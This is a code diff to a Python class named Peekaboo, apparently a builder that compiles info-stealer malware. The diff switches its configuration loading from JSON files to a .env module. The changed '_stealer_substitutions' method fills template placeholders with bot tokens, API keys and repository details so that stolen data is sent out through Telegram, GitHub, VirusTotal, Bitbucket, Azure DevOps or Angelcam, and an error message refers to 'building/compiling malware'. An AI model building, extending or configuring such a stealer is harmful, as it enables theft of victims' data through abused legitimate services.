@@ -5,7 +5,6 @@ import subprocess
 import sys
 import os
 import re
-import json
 import shutil
 from pathlib import Path
 from typing import Optional, Dict
@@ -564,18 +563,23 @@ class Peekaboo:
             print(Colors.error(f"error during merge: {e}"))
             return ""
 
-    def _load_config(self, config_path: Path) -> Optional[dict]:
+    def _load_config(self, name: str) -> Optional[dict]:
+        """Load legacy-shaped config strictly from the project .env."""
         try:
-            if config_path.exists():
-                with config_path.open("r", encoding="utf-8") as f:
-                    data = json.load(f)
-                    print(Colors.success(f"successfully load config: {config_path}"))
-                    return data
-            else:
-                print(Colors.error(f"config not found: {config_path}"))
+            dashboard_dir = Path(__file__).parent / "dashboard"
+            if str(dashboard_dir) not in sys.path:
+                sys.path.insert(0, str(dashboard_dir))
+
+            import cfg as _cfg
+            data = _cfg.get(name)
+            if data is None:
+                print(Colors.error(f"unknown config: {name}"))
                 return None
+
+            print(Colors.success(f"successfully load config from .env: {name}"))
+            return data
         except Exception as e:
-            print(Colors.error(f"error loading config {config_path}: {e}"))
+            print(Colors.error(f"error loading config {name} from .env: {e}"))
             return None
 
     # ---------- main build flow ----------
@@ -617,34 +621,33 @@ class Peekaboo:
             print(Colors.error(f"error building/compiling malware: {e}"))
 
     def _stealer_substitutions(self) -> dict:
-        cfg_dir = Path(__file__).parent / "config"
         subs = {}
         if self.stealer_api == "telegram":
-            cfg = self._load_config(cfg_dir / "telegram_config.json") or {}
+            cfg = self._load_config("telegram_config") or {}
             subs["TELEGRAM_CHAT_ID_PLACEHOLDER"]   = cfg.get("chat_id", "")
             subs["TELEGRAM_BOT_TOKEN_PLACEHOLDER"] = cfg.get("bot_token", "")
         elif self.stealer_api == "github":
-            cfg = self._load_config(cfg_dir / "github_config.json") or {}
+            cfg = self._load_config("github_config") or {}
             subs["github_classic_token"]           = cfg.get("github_token", "")
             subs["GITHUB_REPO_OWNER_PLACEHOLDER"]  = cfg.get("repo_owner", "")
             subs["GITHUB_REPO_NAME_PLACEHOLDER"]   = cfg.get("repo_name", "")
             subs["GITHUB_ISSUE_NUMBER_PLACEHOLDER"] = cfg.get("issue_number", "1")
         elif self.stealer_api == "virustotal":
-            cfg = self._load_config(cfg_dir / "virustotal_config.json") or {}
+            cfg = self._load_config("virustotal_config") or {}
             subs["VT_API_KEY_PLACEHOLDER"]         = cfg.get("vt_api_key", "")
             subs["VT_API_FILE_ID_PLACEHOLDER"]     = cfg.get("file_id", "")
         elif self.stealer_api == "bitbucket":
-            cfg = self._load_config(cfg_dir / "bitbucket_config.json") or {}
+            cfg = self._load_config("bitbucket_config") or {}
             subs["BITBUCKET_TOKEN_PLACEHOLDER"]     = cfg.get("bitbucket_token_base64", "")
             subs["BITBUCKET_WORKSPACE_PLACEHOLDER"] = cfg.get("bitbucket_workspace", "")
             subs["BITBUCKET_REPO_PLACEHOLDER"]      = cfg.get("bitbucket_repo", "")
         elif self.stealer_api == "azure":
-            cfg = self._load_config(cfg_dir / "azure_config.json") or {}
+            cfg = self._load_config("azure_config") or {}
             subs["AZURE_ORG_PLACEHOLDER"]     = cfg.get("azure_org", "")
             subs["AZURE_PROJECT_PLACEHOLDER"] = cfg.get("azure_project", "")
             subs["AZURE_PAT_PLACEHOLDER"]     = cfg.get("azure_pat", "")
         elif self.stealer_api == "angelcam":
-            cfg = self._load_config(cfg_dir / "angelcam_config.json") or {}
+            cfg = self._load_config("angelcam_config") or {}
             subs["ANGELCAM_API_KEY_PLACEHOLDER"] = cfg.get("api_key", "")
         return subs
 
